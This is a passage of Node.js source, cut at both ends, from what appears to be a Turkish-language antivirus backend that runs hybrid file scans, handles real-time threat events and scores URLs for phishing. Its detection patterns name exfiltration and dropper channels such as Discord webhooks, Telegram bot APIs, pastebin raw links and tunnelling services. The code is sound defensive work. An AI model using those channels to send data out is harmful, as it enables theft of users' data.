        reject(new Error('Tarama çıktısı ayrıştırılamadı: ' + stdout.slice(0, 200)));
      }
    });
  });
}

function runStreamingScan(mode = 'quickscan') {
  return new Promise((resolve, reject) => {
    const child = spawn(CSHARP_BIN, [mode, SIG_PATH, WATCH_SANDBOX_DIR, '--stream', '--tier=pro']);
    const rl = readline.createInterface({ input: child.stdout });
    let resultObj = null;
    let stderrData = '';

    child.stderr.on('data', d => { stderrData += d.toString(); });

    rl.on('line', (line) => {
      if (line.startsWith('PROGRESS|')) {
        const parts = line.split('|');
        const scanned = Number(parts[1] || 0);
        const total = Math.max(1, Number(parts[2] || 1));
        const currentFile = parts.slice(3).join('|');
        const percent = Math.min(99, Math.round((scanned / total) * 100));
        broadcastSSE('scan_progress', { scanned, total, currentFile, percent, scanMode: mode });
      } else if (line.startsWith('RESULT|')) {
        try {
          resultObj = JSON.parse(line.slice(7));
        } catch (_) {}
      }
    });

    child.on('close', (code) => {
      if (code === 0 && resultObj) {
        resolve(resultObj);
      } else {
        reject(new Error(stderrData || 'Tarama tamamlanamadı.'));
      }
    });
  });
}

function runSuperLXAnalyzer(filePath, tier = 'pro') {
  return new Promise((resolve, reject) => {
    execFile('python', [SUPERLX_SCRIPT, filePath, tier, SIG_PATH], { maxBuffer: 10 * 1024 * 1024, timeout: 25000 }, (err, stdout, stderr) => {
      if (err) return reject(new Error(stderr || err.message));
      try {
        resolve(JSON.parse(stdout.trim()));
      } catch (e) {
        reject(new Error('SuperLX motor çıktısı okunamadı: ' + stdout.slice(0, 200)));
      }
    });
  });
}

function runPythonAnalyzer(filePath) {
  return new Promise((resolve, reject) => {
    execFile('python', [PYTHON_SCRIPT, filePath, SIG_PATH], { maxBuffer: 10 * 1024 * 1024, timeout: 20000 }, (err, stdout, stderr) => {
      if (err) return reject(new Error(stderr || err.message));
      try {
        resolve(JSON.parse(stdout.trim()));
      } catch (e) {
        reject(new Error('Sezgisel analiz çıktısı okunamadı: ' + stdout.slice(0, 200)));
      }
    });
  });
}

async function performHybridScan(targetPath, scanKindArg = false, streamMode = false) {
  isScanningNow = true;
  const scanKind = scanKindArg === 'full' ? 'full' : scanKindArg === true || scanKindArg === 'quick' ? 'quick' : 'custom';
  const engineLabel = ENGINE_NAME;
  const label = scanKind === 'full'
    ? 'Tam Sistem Taraması (Tüm Sabit Diskler, Kullanıcı Profilleri, Programlar ve Windows)'
    : scanKind === 'quick'
      ? 'Hızlı Sistem Taraması (System32, ProgramData, Startup, Temp, Downloads)'
      : targetPath;

  logEvent('Tarama Başlatıldı', `${engineLabel} ${scanKind === 'full' ? 'Tam Sistem' : scanKind === 'quick' ? 'Hızlı Sistem' : 'Özel Dizin'} Taraması`, `Hedef: ${label}`, 'INFO', label, 'Başlatıldı', { threatLevel: 'Bilgi' });

  try {
    const csharpSummary = scanKind === 'full'
      ? (streamMode ? await runStreamingScan('fullscan') : await runCSharpScanner('fullscan'))
      : scanKind === 'quick'
        ? (streamMode ? await runStreamingScan('quickscan') : await runCSharpScanner('quickscan'))
        : await runCSharpScanner('scan', targetPath);

    stats.totalScans++;
    stats.totalFilesScanned += csharpSummary.total_files_scanned || 0;
    lastScanAt = formatDateTime();

    const detPaths = new Set((csharpSummary.detections || []).map(d => d.path));
    const deepExtSet = new Set([
      '.ps1', '.psm1', '.bat', '.cmd', '.vbs', '.vbe', '.js', '.jse', '.html', '.htm',
      '.hta', '.svg', '.lnk', '.zip', '.rar', '.7z', '.cab', '.iso', '.img', '.vhd',
      '.vhdx', '.pdf', '.rtf', '.iqy', '.slk', '.reg', '.url', '.scf', '.sct', '.wsf',
      '.inf', '.py', '.pyc', '.jar', '.msi', '.msix', '.appx', '.crx', '.xpi',
      '.exe', '.dll', '.sys', '.drv', '.scr'
    ]);
    const candidateItems = [...(csharpSummary.detections || [])];
    const scannedFilesList = csharpSummary.scanned_files || [];
    const sysWinPrefix = (process.env.SystemRoot || 'C:\\Windows').toLowerCase() + path.sep;

    for (const sf of scannedFilesList) {
      if (candidateItems.length >= 160) break;
      const ext = path.extname(sf.file_name || '').toLowerCase();
      const sfLow = String(sf.path || '').toLowerCase();
      if (!detPaths.has(sf.path) && !sf.is_signed && deepExtSet.has(ext) && !sfLow.startsWith(sysWinPrefix)) {
        candidateItems.push(sf);
        detPaths.add(sf.path);
      }
    }
    for (const sf of scannedFilesList) {
      if (candidateItems.length >= 160) break;
      const ext = path.extname(sf.file_name || '').toLowerCase();
      if (!detPaths.has(sf.path) && deepExtSet.has(ext) && (!sf.is_signed || ext === '.sys' || ext === '.ps1')) {
        candidateItems.push(sf);
        detPaths.add(sf.path);
      }
    }

    if (candidateItems.length > 0) {
      let batchMap = new Map();
      if (vortexLiveState.daemonActive) {
        const batchReply = await queryVortexDaemon('batch_inspect', { paths: candidateItems.map(c => c.path), tier: 'pro' }, 20000);
        if (Array.isArray(batchReply?.results)) {
          for (const br of batchReply.results) {
            if (br?.path) batchMap.set(br.path, br);
          }
        }
      }

      for (const item of candidateItems) {
        try {
          const deepRes = batchMap.get(item.path) || await runSuperLXAnalyzer(item.path, 'pro');
          if (deepRes && deepRes.exists) {
            item.risk_score = Math.max(item.risk_score || 0, deepRes.risk_score || 0);
            item.pe_analysis = deepRes.pe_analysis || item.pe_analysis;
            if (deepRes.md5) item.md5 = deepRes.md5;
            if (deepRes.threat_name && !item.threat_name) item.threat_name = deepRes.threat_name;
            if (deepRes.detection_stage) item.detection_stage = deepRes.detection_stage;
            const listReasons = deepRes.findings || deepRes.heuristic_findings || [];
            for (const f of listReasons) {
              if (!item.reasons.includes(f)) item.reasons.push(f);
            }
            if (item.risk_score >= 70) {
              item.status = 'INFECTED';
              item.severity = 'CRITICAL';
            } else if (item.risk_score >= 35 && item.status === 'CLEAN') {
              item.status = 'SUSPICIOUS';
              item.severity = 'MEDIUM';
            }
            if ((item.status === 'INFECTED' || item.status === 'SUSPICIOUS') && !csharpSummary.detections.some(d => d.path === item.path)) {
              csharpSummary.detections.push(item);
            }
          }
        } catch (_) {}
      }
    }

    csharpSummary.threats_found = (csharpSummary.detections || []).filter(d => d.status === 'INFECTED').length;
    csharpSummary.suspicious_found = (csharpSummary.detections || []).filter(d => d.status === 'SUSPICIOUS').length;

    csharpSummary.engine = ENGINE_NAME;
    csharpSummary.scan_kind = scanKind;
    csharpSummary.scan_depth = 'SuperLX 1.0 Çok Katmanlı Derin & Anti-Evasion Taraması';

    if (streamMode) {
      broadcastSSE('scan_progress', {
        scanned: csharpSummary.total_files_scanned,
        total: csharpSummary.total_files_scanned,
        currentFile: 'Tarama doğrulaması tamamlandı.',
        percent: 100,
        done: true,
        scanMode: scanKind,
        summary: csharpSummary
      });
    }

    logEvent(
      scanKind === 'full' ? 'Tam Sistem Taraması' : scanKind === 'quick' ? 'Hızlı Sistem Taraması' : 'Özel Dizin Taraması',
      `Tarama Tamamlandı (${csharpSummary.duration_ms} ms)`,
      `${csharpSummary.total_files_scanned.toLocaleString('tr-TR')} dosya tarandı (${csharpSummary.files_per_second} dosya/sn) · ${csharpSummary.scan_depth}.`,
      csharpSummary.threats_found > 0 ? 'CRITICAL' : 'SAFE',
      label,
      csharpSummary.threats_found > 0 ? `${csharpSummary.threats_found} Tehdit` : 'Temiz',
      {
        riskScore: csharpSummary.threats_found > 0 ? 90 : 0,
        threatLevel: csharpSummary.threats_found > 0 ? 'Kritik' : 'Güvenli'
      }
    );

    return csharpSummary;
  } finally {
    isScanningNow = false;
  }
}

// Persistent AEGIS-VORTEX Daemon Bridge (Zero Cold-Start Delay + Live Canary & Lineage Telemetry)
let vortexProc = null;
const vortexPending = new Map();

function startVortexDaemon() {
  if (shuttingDown || !fs.existsSync(VORTEX_DAEMON_SCRIPT)) return;
  try {
    vortexProc = spawn('python', [VORTEX_DAEMON_SCRIPT, ROOT_DIR, WATCH_SANDBOX_DIR], {
      stdio: ['pipe', 'pipe', 'pipe'],
      windowsHide: true
    });

    const rl = readline.createInterface({ input: vortexProc.stdout });
    rl.on('line', (line) => {
      try {
        const msg = JSON.parse(line);
        if (msg.kind === 'ready') {
          vortexLiveState.daemonActive = true;
          vortexLiveState.canaryCount = msg.canary_count || 3;
          vortexLiveState.monitoredProcesses = msg.monitored_processes || 0;
          queryVortexDaemon('set_policy', { realtime_enabled: realtimeEnabled, auto_quarantine: autoQuarantine }).catch(() => {});
        } else if (msg.kind === 'heartbeat') {
          vortexLiveState.canaryCount = msg.canary_count || vortexLiveState.canaryCount;
          vortexLiveState.monitoredProcesses = msg.monitored_processes || vortexLiveState.monitoredProcesses;
        } else if (msg.kind === 'reply' && msg.id && vortexPending.has(msg.id)) {
          const { resolve, timer } = vortexPending.get(msg.id);
          clearTimeout(timer);
          vortexPending.delete(msg.id);
          resolve(msg);
        } else if (msg.kind === 'bus_event' && msg.packet) {
          const pkt = msg.packet;
          const pld = pkt.payload || {};
          const evTypeMap = {
            SUSPICIOUS_LINEAGE_DETECTED: 'Soy Ağacı Anomali Tespiti',
            SYSTEM_MASQUERADE_DETECTED: 'Sistem Süreci Taklidi',
            FILELESS_CMDLINE_BLOCKED: 'Dosyasız Komut Satırı Kalkanı',
            ON_EXECUTE_THREAT_BLOCKED: 'Çalıştırma Anı (On-Execute) Kalkanı',
            PERSISTENCE_MODIFICATION_DETECTED: 'Kalıcılık Kancası Uyarısı',
            PERSISTENCE_BLOCKED_AND_REVERTED: 'Kalıcılık Kalkanı (Otomatik Temizleme)',
            MEMORY_INJECTION_DETECTED: 'Canlı Bellek Enjeksiyon Kalkanı',
            PROCESS_HOLLOWING_DETECTED: 'Process Hollowing Kalkanı',
            DLL_INJECTION_DETECTED: 'Canlı DLL Enjeksiyonu & Side-Loading Kalkanı',
            C2_NETWORK_CONTAINED: 'Aktif C2 Soket İzolasyonu',
            CANARY_TRIPWIRE_TRIGGERED: 'Canary Fidye Kapanı Tetiklendi',
            AUTONOMOUS_EXECUTION_AND_ROLLBACK: 'Otonom İnfaz ve Geri Sarma',
            TAMPER_ATTEMPT_BLOCKED: 'Öz-Koruma Müdahale Engeli'
          };
          const criticalHitEvents = new Set([
            'FILELESS_CMDLINE_BLOCKED',
            'ON_EXECUTE_THREAT_BLOCKED',
            'PERSISTENCE_BLOCKED_AND_REVERTED',
            'MEMORY_INJECTION_DETECTED',
            'PROCESS_HOLLOWING_DETECTED',
            'DLL_INJECTION_DETECTED',
            'C2_NETWORK_CONTAINED',
            'CANARY_TRIPWIRE_TRIGGERED',
            'AUTONOMOUS_EXECUTION_AND_ROLLBACK',
            'SUSPICIOUS_LINEAGE_DETECTED',
            'SYSTEM_MASQUERADE_DETECTED'
          ]);
          if (criticalHitEvents.has(pkt.event_type)) {
            stats.realtimeInterceptions++;
          }
          if (
            pkt.event_type === 'FILELESS_CMDLINE_BLOCKED'
            || pkt.event_type === 'MEMORY_INJECTION_DETECTED'
            || pkt.event_type === 'PROCESS_HOLLOWING_DETECTED'
            || pkt.event_type === 'DLL_INJECTION_DETECTED'
            || pkt.event_type === 'PERSISTENCE_BLOCKED_AND_REVERTED'
            || pkt.event_type === 'C2_NETWORK_CONTAINED'
          ) {
            stats.totalThreatsBlocked++;
          }
          if (
            pkt.event_type === 'ON_EXECUTE_THREAT_BLOCKED'
            || pkt.event_type === 'PROCESS_HOLLOWING_DETECTED'
            || pkt.event_type === 'MEMORY_INJECTION_DETECTED'
            || pkt.event_type === 'DLL_INJECTION_DETECTED'
            || pkt.event_type === 'SYSTEM_MASQUERADE_DETECTED'
            || pkt.event_type === 'PERSISTENCE_BLOCKED_AND_REVERTED'
            || pkt.event_type === 'C2_NETWORK_CONTAINED'
          ) {
            if (pkt.event_type === 'ON_EXECUTE_THREAT_BLOCKED') {
              stats.totalThreatsBlocked++;
            }
            const qTargets = [pld.file_path, pld.dll_path, pld.payload_path].filter(Boolean);
            if (autoQuarantine && (pld.should_quarantine || pkt.event_type === 'ON_EXECUTE_THREAT_BLOCKED')) {
              for (const qt of qTargets) {
                const qtLow = path.resolve(qt).toLowerCase();
                if (fs.existsSync(qt) && !qtLow.startsWith('c:\\windows\\') && !qtLow.startsWith('c:\\program files\\')) {
                  quarantineFile(qt, pld.threat_name || pkt.event_type, pld.score_delta || 90, [pld.description || pkt.event_type]);
                }
              }
            }
          }
          const targetLoc = pld.child_path || pld.canary_path || pld.file_path || pld.subkey || (pld.cmdline ? `PID ${pkt.pid}: ${pld.cmdline.slice(0, 90)}` : 'Çekirdek Koruma Servisleri');
          logEvent(
            evTypeMap[pkt.event_type] || pkt.event_type,
            pld.description || pkt.event_type,
            pld.cmdline ? `Komut: ${pld.cmdline.slice(0, 140)} · AegisCore ${pkt.source_module}` : `AegisCore ${pkt.source_module} tarafından tespit edildi.`,
            pkt.severity === 'CRITICAL' ? 'CRITICAL' : 'WARNING',
            targetLoc,
            pkt.severity === 'CRITICAL' ? 'Engellendi' : 'İzleniyor',
            {
              pid: pkt.pid,
              riskScore: pld.score_delta || 85,
              threatLevel: pkt.severity === 'CRITICAL' ? 'Kritik' : 'Yüksek',
              lineage: pld.parent_name ? `${pld.parent_name} -> ${pld.child_name} (PID ${pkt.pid})` : undefined
            }
          );
        }
      } catch (_) {}
    });

    vortexProc.on('exit', () => {
      vortexLiveState.daemonActive = false;
      vortexProc = null;
      for (const [id, pending] of vortexPending.entries()) {
        clearTimeout(pending.timer);
        pending.resolve(null);
      }
      vortexPending.clear();
      if (!shuttingDown) {
        setTimeout(startVortexDaemon, 3000);
      }
    });
  } catch (_) {}
}

function queryVortexDaemon(cmd, payload = {}, timeoutMs = 4500) {
  return new Promise((resolve) => {
    if (!vortexProc || !vortexProc.stdin.writable) {
      return resolve(null);
    }
    const id = crypto.randomUUID();
    const timer = setTimeout(() => {
      vortexPending.delete(id);
      resolve(null);
    }, timeoutMs);

    vortexPending.set(id, { resolve, timer });
    try {
      vortexProc.stdin.write(JSON.stringify({ id, cmd, ...payload }) + '\n');
    } catch (_) {
      clearTimeout(timer);
      vortexPending.delete(id);
      resolve(null);
    }
  });
}

startVortexDaemon();

function readMotwInfo(filePath) {
  if (process.platform !== 'win32') return null;
  try {
    const adsPath = `${filePath}:Zone.Identifier`;
    if (!fs.existsSync(adsPath)) return null;
    const raw = fs.readFileSync(adsPath, 'utf8');
    const zoneMatch = raw.match(/ZoneId\s*=\s*(\d+)/i);
    if (!zoneMatch) return null;
    const zoneId = Number(zoneMatch[1]);
    const hostMatch = raw.match(/HostUrl\s*=\s*(.+)/i);
    const refMatch = raw.match(/ReferrerUrl\s*=\s*(.+)/i);
    return {
      zoneId,
      fromInternet: zoneId >= 3,
      hostUrl: hostMatch ? hostMatch[1].trim() : '',
      referrerUrl: refMatch ? refMatch[1].trim() : ''
    };
  } catch (_) {
    return null;
  }
}

function normalizeMotw(rawMotw, filePath) {
  if (!rawMotw || typeof rawMotw !== 'object') return readMotwInfo(filePath);

  const zoneId = Number(rawMotw.zoneId ?? rawMotw.zone_id ?? 0);
  const hostUrl = String(rawMotw.hostUrl || rawMotw.host_url || '').trim();
  const referrerUrl = String(rawMotw.referrerUrl || rawMotw.referrer_url || '').trim();
  const fromInternet = Boolean(rawMotw.fromInternet ?? rawMotw.from_internet ?? (zoneId >= 3));

  if (!zoneId && !hostUrl && !referrerUrl) return null;
  return { zoneId, fromInternet, hostUrl, referrerUrl };
}

const MOTW_RISKY_EXTS = new Set([
  '.exe', '.dll', '.scr', '.bat', '.cmd', '.ps1', '.vbs', '.vbe', '.js', '.jse',
  '.hta', '.msi', '.msp', '.com', '.pif', '.lnk', '.iso', '.img', '.vhd', '.vhdx',
  '.cab', '.chm', '.xll', '.one', '.wsf', '.wsh', '.sct', '.reg', '.application',
  '.search-ms', '.library-ms', '.mht', '.mhtml', '.crx', '.xpi', '.svg', '.html', '.htm'
]);

const SAFE_LARGE_MEDIA_EXTS = new Set([
  '.mp4', '.mkv', '.avi', '.mov', '.webm', '.m4v', '.mp3', '.wav', '.flac', '.ogg', '.m4a'
]);

// Active Web Virus Shield — URL, Phishing, Drive-By & Malicious Origin Reputation Analyzer
const WEB_SUSPICIOUS_TLDS = new Set([
  '.tk', '.ml', '.ga', '.cf', '.gq', '.top', '.xyz', '.click', '.zip', '.mov',
  '.icu', '.buzz', '.cfd', '.sbs', '.rest', '.work', '.loan', '.date', '.men', '.kim'
]);
const WEB_BRAND_PHISH_TOKENS = [
  'e-devlet', 'turkiye-gov', 'garanti-bbva', 'ziraat-bank', 'isbank-giris', 'akbank-giris',
  'paypal', 'paypa1', 'micros0ft', 'microsoft-verify', 'office365-login', 'g00gle',
  'google-verify', 'discord-nitro', 'steam-gift', 'steamcommunity-', 'cloudflare-verify',
  'captcha-verify', 'human-verify', 'wallet-connect', 'metamask-', 'binance-login', 'apple-id'
];
const WEB_OFFICIAL_ALLOW_HOSTS = new Set([
  'paypal.com', 'microsoft.com', 'google.com', 'discord.com', 'steamcommunity.com',
  'cloudflare.com', 'binance.com', 'apple.com', 'turkiye.gov.tr', 'garantibbva.com.tr',
  'ziraatbank.com.tr', 'isbank.com.tr', 'akbank.com', 'github.com', 'metamask.io'
]);

function analyzeWebUrl(rawUrl) {
  const input = String(rawUrl || '').trim();
  if (!input) {
    return { url: '', riskScore: 0, status: 'CLEAN', threatName: '', reasons: [] };
  }
  const low = input.toLowerCase();
  let risk = 0;
  const reasons = [];
  let threatName = '';

  if (/^(?:javascript:|vbscript:|ms-msdt:|search-ms:|data:(?:text\/html|application\/octet-stream|application\/x-msdownload))/i.test(low)) {
    risk = Math.max(risk, 96);
    threatName = 'Web.DangerousScheme.DriveByExec';
    reasons.push('Tehlikeli URI şeması (javascript:/data:/ms-msdt:/search-ms:) ile tarayıcı içi kod yürütme');
    return { url: input, riskScore: risk, status: 'INFECTED', threatName, reasons };
  }

  let parsed = null;
  try {
    parsed = new URL(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(input) ? input : `http://${input}`);
  } catch (_) {
    return { url: input, riskScore: 45, status: 'SUSPICIOUS', threatName: 'Web.MalformedUrl.Obfuscated', reasons: ['Standart dışı / gizlenmiş URL biçimi'] };
  }

  const host = (parsed.hostname || '').toLowerCase();
  const fullPath = `${parsed.pathname || ''}${parsed.search || ''}`.toLowerCase();
  const isOfficial = Array.from(WEB_OFFICIAL_ALLOW_HOSTS).some(d => host === d || host.endsWith('.' + d));

  if (parsed.username || parsed.password || input.includes('@')) {
    risk = Math.min(100, risk + 65);
    threatName = threatName || 'Web.Phishing.CredentialAtSpoof';
    reasons.push('URL içinde "@" ile alan adı kimlik gizleme (Credential/Host Spoofing)');
  }
  if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(host)) {
    risk = Math.min(100, risk + 50);
    threatName = threatName || 'Web.C2.DirectIPHost';
    reasons.push(`Alan adı yerine doğrudan IP adresi (${host}) üzerinden bağlantı/indirme`);
  }
  if (host.includes('xn--')) {
    risk = Math.min(100, risk + 45);
    threatName = threatName || 'Web.Phishing.PunycodeHomograph';
    reasons.push('Punycode (xn--) homograf alan adı taklidi şüphesi');
  }
  const tldMatch = host.match(/\.[a-z0-9-]+$/i);
  if (tldMatch && WEB_SUSPICIOUS_TLDS.has(tldMatch[0])) {
    risk = Math.min(100, risk + 28);
    reasons.push(`Yüksek riskli / istismar eğilimli üst düzey alan adı (${tldMatch[0]})`);
  }
  if (!isOfficial) {
    const phishHit = WEB_BRAND_PHISH_TOKENS.find(tok => host.includes(tok) || fullPath.includes(tok));
    if (phishHit) {
      risk = Math.min(100, risk + 58);
      threatName = threatName || 'Web.Phishing.BrandImpersonation';
      reasons.push(`Resmi olmayan alan adında marka/oltalama kalıbı tespit edildi (${phishHit})`);
    }
  }
  if (/(?:discord\.com\/api\/webhooks|api\.telegram\.org\/bot|pastebin\.com\/raw|transfer\.sh|ngrok-free\.app|trycloudflare\.com)/i.test(low)) {
    risk = Math.min(100, risk + 62);
    threatName = threatName || 'Web.C2.ExfilOrDropperEndpoint';
    reasons.push('Bilinen zararlı yük dağıtım veya C2 veri sızdırma servisi (Webhook/Tunnel/Raw Drop)');
  }
  if (/\.(?:exe|scr|hta|msi|ps1|vbs|vbe|js|jse|bat|cmd|lnk|iso|img|vhd|reg|search-ms|crx)(?:$|[?#])/i.test(fullPath)) {
    risk = Math.min(100, risk + 38);
    threatName = threatName || 'Web.DriveBy.ExecutableDownload';
    reasons.push('URL doğrudan çalıştırılabilir veya betik tabanlı tehlikeli yük indiriyor');
  }
  if (host.split('.').length >= 5) {
    risk = Math.min(100, risk + 20);
    reasons.push('Aşırı alt alan adı zinciri (Oltalama / DGA şüphesi)');
  }
  if (parsed.protocol === 'http:' && /(?:login|signin|verify|captcha|bank|wallet|download|update)/i.test(fullPath)) {
    risk = Math.min(100, risk + 18);
    reasons.push('Şifresiz HTTP bağlantısı üzerinden hassas oturum/indirme isteği');
  }

  const status = risk >= 70 ? 'INFECTED' : risk >= 35 ? 'SUSPICIOUS' : 'CLEAN';
  return {
    url: input,
    host,
    riskScore: risk,
    status,
    threatName: status === 'CLEAN' ? '' : (threatName || 'Web.Heuristic.MaliciousSite'),
    reasons
  };
}

async function inspectFileDual(fullPath, allowDetonate = false, deepDetails = false) {
  const tStart = Date.now();
  let fileSizeBytes = 0;
  let cacheKey = '';
  try {
    const st = fs.statSync(fullPath);
    fileSizeBytes = st.size;
    cacheKey = `${fullPath.toLowerCase()}|${st.size}|${Math.round(st.mtimeMs)}`;
  } catch (_) {}

  if (!deepDetails && cacheKey && cleanVerdictCache.has(cacheKey)) {
    perfMetrics.cacheHits++;
    return { ...cleanVerdictCache.get(cacheKey) };
  }

  const cs = await runCSharpScanner('scanfile', fullPath).catch(() => null);

  if (!deepDetails && cs) {
    const isStage1Critical = cs.status === 'INFECTED' && (cs.risk_score || 0) >= 95 && cs.detection_stage?.startsWith('Aşama 1');
    const isSignedClean = Boolean(cs.is_signed && cs.is_pe && cs.status === 'CLEAN');
    const extFast = path.extname(fullPath).toLowerCase();
    const isCleanLargeMedia = fileSizeBytes > 20 * 1024 * 1024 && !cs.is_pe && cs.status === 'CLEAN' && SAFE_LARGE_MEDIA_EXTS.has(extFast);
    if (isStage1Critical || isSignedClean || isCleanLargeMedia) {
      const motw = readMotwInfo(fullPath);
      const elapsedMs = Math.max(0.1, Date.now() - tStart);
      perfMetrics.totalSamples++;
      perfMetrics.avgInspectMs = perfMetrics.totalSamples === 1
        ? Number(elapsedMs.toFixed(1))
        : Number((perfMetrics.avgInspectMs * 0.8 + elapsedMs * 0.2).toFixed(1));

      const isFastClean = isSignedClean || isCleanLargeMedia;
      const fastVerdict = {
        engine: ENGINE_NAME,
        blind_spots_caught: [],
        file_name: path.basename(fullPath),
        path: fullPath,
        size_bytes: cs.size_bytes ?? fileSizeBytes,
        risk_score: isFastClean ? 0 : cs.risk_score,
        status: isFastClean ? 'CLEAN' : 'INFECTED',
        threat_name: isFastClean ? '' : (cs.threat_name || 'Known.Malware.Signature'),
        detection_stage: cs.detection_stage || (isSignedClean ? 'Temiz (Güvenilir İmza)' : isCleanLargeMedia ? 'Temiz (Medya Akış Kalkanı)' : 'Aşama 1: Virüs İmzası'),
        entropy: cs.entropy ?? 0,
        sha256: cs.sha256 || '',
        fuzzy_hash: '',
        md5: '',
        is_signed: Boolean(cs.is_signed),
        signer: cs.signer || '',
        motw,
        pe_analysis: {},
        process_injection_flag: false,
        findings: isFastClean ? [] : (cs.reasons || [])
      };

      if (fastVerdict.status === 'CLEAN' && cacheKey && (!motw || !motw.fromInternet)) {
        if (cleanVerdictCache.size >= 1000) {
          const oldestKey = cleanVerdictCache.keys().next().value;
          if (oldestKey) cleanVerdictCache.delete(oldestKey);
        }
        cleanVerdictCache.set(cacheKey, fastVerdict);
      }
      return fastVerdict;
    }
  }

  const isLargeStream = fileSizeBytes > 20 * 1024 * 1024;
  const precomputedForPy = cs ? { sha256: cs.sha256 || '', is_signed: Boolean(cs.is_signed), signer: cs.signer || '' } : null;

  const [vortexRes, pyFallbackRes] = await Promise.allSettled([
    !isLargeStream && vortexLiveState.daemonActive
      ? queryVortexDaemon('inspect_file', { path: fullPath, tier: 'pro', detonate: allowDetonate, precomputed: precomputedForPy })
      : Promise.resolve(null),
    isLargeStream || !vortexLiveState.daemonActive
      ? runSuperLXAnalyzer(fullPath, 'pro')
      : Promise.resolve(null)
  ]);

  const vx = vortexRes.status === 'fulfilled' && vortexRes.value?.result ? vortexRes.value.result : null;
  const py = pyFallbackRes.status === 'fulfilled' ? pyFallbackRes.value : null;

  if (!cs && !vx && !py) return null;

  const vxStatic = vx?.static_analysis || null;
  const vxScore = vx?.engine_score ?? vx?.vortex_score ?? 0;
  const vxFindings = vx?.findings || [];
  const motw = normalizeMotw(vx?.motw || py?.motw, fullPath);

  const isSigned = Boolean(cs?.is_signed || vxStatic?.is_signed || py?.is_signed);
  const bypassFlag = Boolean(
    vxStatic?.process_injection_flag
    || (vx?.blind_spots_caught || []).some(b => b === 'SIGNED_CERT_PADDING_HIJACK' || b === 'BYOVD_VULNERABLE_DRIVER')
    || cs?.status === 'INFECTED'
    || py?.status === 'INFECTED'
  );
  const csSignedClean = isSigned
    && Boolean(vxStatic?.is_pe ?? cs?.is_pe)
    && !bypassFlag
    && vxScore < 70
    && (py?.risk_score || 0) < 70;
  const rawMaxScore = Math.max(cs?.risk_score || 0, py?.risk_score || 0, vxScore);
  let combinedScore = csSignedClean ? 0 : rawMaxScore;

  const findings = csSignedClean
    ? []
    : Array.from(new Set([...(cs?.reasons || []), ...(py?.findings || py?.heuristic_findings || []), ...vxFindings]));

  const ext = path.extname(fullPath).toLowerCase();
  if (motw && motw.fromInternet && !csSignedClean) {
    const motwSource = motw.hostUrl || motw.referrerUrl || `ZoneId=${motw.zoneId}`;
    if (webProtectionEnabled && (motw.hostUrl || motw.referrerUrl)) {
      const urlAudit = analyzeWebUrl(motw.hostUrl || motw.referrerUrl);
      if (urlAudit.riskScore >= 35) {
        combinedScore = Math.min(100, Math.max(combinedScore, urlAudit.riskScore) + (MOTW_RISKY_EXTS.has(ext) ? 20 : 10));
        findings.push(`[Web Virüs Kalkanı] Zararlı indirme kaynağı (${urlAudit.riskScore}/100): ${urlAudit.reasons[0] || motwSource}`);
      }
    }
    if (MOTW_RISKY_EXTS.has(ext) || vxStatic?.is_pe) {
      if (combinedScore >= 50 && combinedScore < 70) {
        combinedScore = Math.min(92, combinedScore + 25);
      } else if (combinedScore > 0 && combinedScore < 50) {
        combinedScore = Math.max(combinedScore, Math.min(85, combinedScore + 18));
      } else if (combinedScore === 0 && (MOTW_RISKY_EXTS.has(ext) || (vxStatic?.is_pe && !isSigned))) {
        combinedScore = 40;
      }
      findings.push(`[MotW · İnternet İndirmesi] Kaynak: ${motwSource} (Dijital İmza: Yok)`);
    } else if (combinedScore >= 35) {
      findings.push(`[MotW · İnternet İndirmesi] Kaynak: ${motwSource}`);
    }
  }

  const status = combinedScore >= 70 ? 'INFECTED' : combinedScore >= 35 ? 'SUSPICIOUS' : 'CLEAN';
  const threatName = cs?.threat_name || vx?.threat_name || py?.threat_name || (vxStatic?.process_injection_flag ? 'Trojan.PE.ProcessInjection' : vxStatic?.fuzzy_match?.malware_name || (motw?.fromInternet && status === 'SUSPICIOUS' ? 'Heuristic.InternetDownload.Unsigned' : 'Heuristic.AegisCore.Threat'));
  const detectionStage = cs?.detection_stage?.startsWith('Aşama 1')
    ? cs.detection_stage
    : (vx?.detection_stage || py?.detection_stage || cs?.detection_stage || `${ENGINE_NAME} Derin Analiz`);

  const elapsedMs = Math.max(0.1, Date.now() - tStart);
  perfMetrics.totalSamples++;
  perfMetrics.avgInspectMs = perfMetrics.totalSamples === 1
    ? Number(elapsedMs.toFixed(1))
    : Number((perfMetrics.avgInspectMs * 0.8 + elapsedMs * 0.2).toFixed(1));

  const peAnalysis = py?.pe_analysis || (vxStatic ? {
    is_pe: vxStatic.is_pe,
    architecture: vxStatic.pe_arch,
    sections: vxStatic.sections,
    ...(deepDetails && vxStatic.imported_dlls ? { imported_apis: Object.values(vxStatic.imported_dlls).flat().slice(0, 32) } : {})
  } : {});

  const finalVerdict = {
    engine: ENGINE_NAME,
    blind_spots_caught: vx?.blind_spots_caught || py?.blind_spots_caught || [],
    file_name: path.basename(fullPath),
    path: fullPath,
    size_bytes: vxStatic?.size_bytes ?? py?.size_bytes ?? cs?.size_bytes ?? fileSizeBytes,
    risk_score: combinedScore,
    status,
    threat_name: threatName,
    detection_stage: detectionStage,
    entropy: vxStatic?.overall_entropy ?? py?.entropy ?? cs?.entropy ?? 0,
    sha256: vxStatic?.sha256 || py?.sha256 || cs?.sha256 || '',
    fuzzy_hash: vxStatic?.fuzzy_hash || '',
    md5: py?.md5 || '',
    is_signed: isSigned,
    signer: cs?.signer || vxStatic?.signer || py?.signer || '',
    motw,
    pe_analysis: peAnalysis,
    process_injection_flag: Boolean(vxStatic?.process_injection_flag),
    findings
  };

  if (status === 'CLEAN' && cacheKey && (!motw || !motw.fromInternet)) {
    if (cleanVerdictCache.size >= 1000) {
      const oldestKey = cleanVerdictCache.keys().next().value;
      if (oldestKey) cleanVerdictCache.delete(oldestKey);
    }
    cleanVerdictCache.set(cacheKey, { ...finalVerdict, pe_analysis: {} });
  }
  return finalVerdict;
}

// Multi-Zone Real-Time Shield & Auto-Download Inspection Pipeline
const PARTIAL_DOWNLOAD_EXTS = new Set([
  '.crdownload', '.part', '.opdownload', '.partial', '.tmp',
  '.download', '.!ut', '.!qb', '.aria2', '.filepart', '.bc!'
]);

const TEMP_FILTER_EXTS = new Set([
  '.exe', '.dll', '.scr', '.sys', '.drv', '.ocx', '.cpl', '.bat', '.cmd',
  '.ps1', '.psm1', '.psd1', '.ps1xml', '.vbs', '.vbe', '.js', '.jse', '.hta',
